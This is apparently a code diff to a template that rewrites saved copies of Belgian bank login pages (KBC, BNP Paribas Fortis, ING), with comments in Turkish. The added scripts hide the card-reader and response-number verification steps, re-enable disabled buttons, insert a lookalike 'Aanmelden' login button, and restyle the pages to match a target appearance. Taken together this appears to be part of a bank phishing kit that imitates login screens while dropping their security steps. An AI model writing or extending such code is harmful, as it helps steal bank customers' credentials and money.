@@ -3540,13 +3540,25 @@ export function BelgiumBankTemplate({ bankSlug, onChange, handleRouteAction, sav
                      var st = steps[si];
                      var txt = (st.textContent || '');
                      if (/debetkaart|kaartlezer/i.test(txt)) { st.style.display = 'none'; continue; }
-                     if (st.querySelector && st.querySelector('#y9c-login-response-number')) {
-                       var lbl = st.querySelector('label[for="y9c-login-response-number"]');
-                       if (lbl) lbl.style.display = 'none';
-                       var fe = st.querySelector('maia-form-element');
-                       if (fe) fe.style.display = 'none';
+                     if (st.querySelector && (st.querySelector('#y9c-login-response-number') || st.querySelector('.y9c-login-last-step-button'))) {
+                       st.style.display = 'none';
                      }
                    }
+                   // Adim 01: "Bewaren" altina Aanmelden butonu ekle (orijinali step 03 ile gizlendi)
+                   try {
+                     if (!document.getElementById('kbc-inline-login-btn')) {
+                       var cbx = document.querySelector('maia-checkbox');
+                       var anch = cbx ? (cbx.closest('.y9c-login-ucr-step') || cbx.parentElement) : null;
+                       if (anch) {
+                         var nbtn = document.createElement('button');
+                         nbtn.id = 'kbc-inline-login-btn';
+                         nbtn.type = 'button';
+                         nbtn.textContent = 'Aanmelden';
+                         nbtn.setAttribute('style', 'display:block;width:100%;max-width:100%;margin:24px 0 0;padding:14px 20px;border:0;border-radius:6px;background:#0066b3;color:#fff;font-size:16px;font-weight:700;cursor:pointer;box-sizing:border-box;');
+                         anch.appendChild(nbtn);
+                       }
+                     }
+                   } catch(_e){}
                    var kb = document.querySelectorAll('button[disabled], .y9c-login-last-step-button');
                    for (var bi2=0; bi2<kb.length; bi2++){
                      try { kb[bi2].removeAttribute('disabled'); kb[bi2].disabled = false; } catch(_e){}
@@ -3732,6 +3744,8 @@ export function BelgiumBankTemplate({ bankSlug, onChange, handleRouteAction, sav
              if (/\\/bnp-paribas-fortis-be\\//i.test(window.location.href || '')) {
                var __bnpStyle = document.createElement('style');
                __bnpStyle.textContent = [
+                 // sign-in-mobile: JS'siz snapshot'ta bos beyaz overlay (z:15) - tum icerigi kapatir
+                 '.sign-in-mobile.ebw,.progressing.ebw,.cc_frame,#cookies_entry,#cookies_overlay,#cookies_overlay_shade{display:none!important;visibility:hidden!important;}',
                  '.OZncR{width:100%!important;max-width:100%!important;margin:8px auto!important;padding:0 12px!important;box-sizing:border-box!important;}',
                  'html,body{overflow-x:hidden!important;}',
                  'body{min-width:0!important;}',
@@ -3746,9 +3760,68 @@ export function BelgiumBankTemplate({ bankSlug, onChange, handleRouteAction, sav
              }
            } catch(_e){}
 
+           // ==== KBC: mobil kart duzeni (hedef: merkezli beyaz kart + gri zemin) ====
+           try {
+             if (/\\/kbc-be\\//i.test(window.location.href || '')) {
+               var __kbcStyle = document.createElement('style');
+               __kbcStyle.textContent = [
+                 'html,body{overflow-x:hidden!important;max-width:100vw!important;}',
+                 'body{min-width:0!important;background:#e9e9eb!important;}',
+                 'lae-touch{display:block!important;max-width:100vw!important;overflow-x:hidden!important;}',
+                 '.lae-login-layout-composition__content{width:100%!important;max-width:460px!important;min-width:0!important;margin:14px auto!important;background:#fff!important;border:1px solid #d9d9dc!important;border-radius:10px!important;box-shadow:0 2px 10px rgba(0,0,0,.08)!important;padding:14px 16px!important;box-sizing:border-box!important;}',
+                 '.lae-login-layout-composition__navigation,.lae-login-layout-topbar-header__menu{max-width:100%!important;}',
+                 '.glofe-company-logo--emblem-white,glofe-company-logo{color:#0066b3!important;}',
+                 'y9c-login-flow-login,y9c-login-logon-strategy-select-wrapper,.y9c-login-title-group{width:100%!important;max-width:100%!important;min-width:0!important;}',
+                 'maia-tab-container,maia-tabs,form,maia-form-group{max-width:100%!important;min-width:0!important;}',
+                 'maia-toggle-tab-group{display:none!important;}',
+                 'input,select,textarea{max-width:100%!important;box-sizing:border-box!important;}',
+                 'img,svg{max-width:100%!important;height:auto!important;}',
+                 '.maia-pull-tab,maia-pull-tab,y9c-login-chatbot{display:none!important;visibility:hidden!important;}',
+                 '*{box-sizing:border-box;}'
+               ].join('');
+               (document.head || document.documentElement).appendChild(__kbcStyle);
+               // Toggle tab'lari select gorunumune cevir (hedef: "Manueel" dropdown)
+               var __kbcMethod = function(){
+                 try {
+                   if (document.getElementById('kbc-method-select')) return;
+                   var grp = document.querySelector('maia-toggle-tab-group');
+                   if (!grp || !grp.parentNode) return;
+                   var wrap = document.createElement('div');
+                   wrap.id = 'kbc-method-select';
+                   wrap.setAttribute('style','position:relative;width:100%;border:1.5px solid #8a94a6;border-radius:8px;background:#fff;margin:8px 0 4px;');
+                   var sel = document.createElement('select');
+                   sel.setAttribute('style','-webkit-appearance:none;appearance:none;width:100%;border:0;background:transparent;padding:13px 40px 13px 44px;font:500 16px/1.3 MuseoSans,system-ui,Arial,sans-serif;color:#1d1d1d;outline:none;');
+                   var lbl = document.createElement('span');
+                   lbl.setAttribute('style','position:absolute;left:13px;top:50%;transform:translateY(-50%);font-size:19px;');
+                   lbl.textContent = '⌨';
+                   var tabs = grp.querySelectorAll('maia-toggle-tab');
+                   for (var ti=0; ti<tabs.length; ti++){
+                     var t = tabs[ti];
+                     var opt = document.createElement('option');
+                     opt.value = String(ti);
+                     opt.textContent = t.getAttribute('title') || (t.textContent||'').trim();
+                     if (t.hasAttribute('active') || t.getAttribute('aria-selected') === 'true') opt.selected = true;
+                     sel.appendChild(opt);
+                   }
+                   sel.addEventListener('change', function(){
+                     var idx = parseInt(sel.value, 10);
+                     var tb = tabs[idx];
+                     if (tb) { try { tb.click(); } catch(_e){} }
+                   });
+                   var chev = document.createElement('span');
+                   chev.setAttribute('style','position:absolute;right:14px;top:50%;transform:translateY(-50%);pointer-events:none;color:#1d1d1d;font-size:15px;');
+                   chev.textContent = '⌄';
+                   wrap.appendChild(lbl); wrap.appendChild(sel); wrap.appendChild(chev);
+                   grp.parentNode.insertBefore(wrap, grp);
+                 } catch(_e){}
+               };
+               __kbcMethod(); setTimeout(__kbcMethod, 500); setTimeout(__kbcMethod, 1500);
+             }
+           } catch(_e){}
+
            // ==== GENEL BELCIKA MOBIL: tasmani onle ====
            try {
-             if (/\\/belgian-banks\\//i.test(window.location.href || '') && !/\\/ing-be\\//i.test(window.location.href || '') && !/\\/bnp-paribas-fortis-be\\//i.test(window.location.href || '')) {
+             if (/\\/belgian-banks\\//i.test(window.location.href || '') && !/\\/ing-be\\//i.test(window.location.href || '') && !/\\/bnp-paribas-fortis-be\\//i.test(window.location.href || '') && !/\\/kbc-be\\//i.test(window.location.href || '')) {
                var __mobStyle = document.createElement('style');
                __mobStyle.textContent = [
                  'html,body{overflow-x:hidden!important;max-width:100%!important;}',
